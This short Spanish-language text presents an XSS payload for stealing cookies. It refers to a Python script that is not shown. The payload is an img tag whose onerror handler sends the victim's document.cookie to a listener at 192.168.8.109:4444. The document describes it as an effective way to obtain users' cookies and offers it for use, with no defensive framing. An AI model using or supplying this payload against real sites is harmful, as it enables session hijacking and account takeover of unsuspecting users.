Un script en python corto pero efectivo para con un XSS, para hacer una solicitud de tipo GET y poder obtener las cookies del usuario de manera exitosa.

XSS: <img src=notexist onerror=this.src='http://192.168.8.109:4444/grab.py?'+document.cookie>
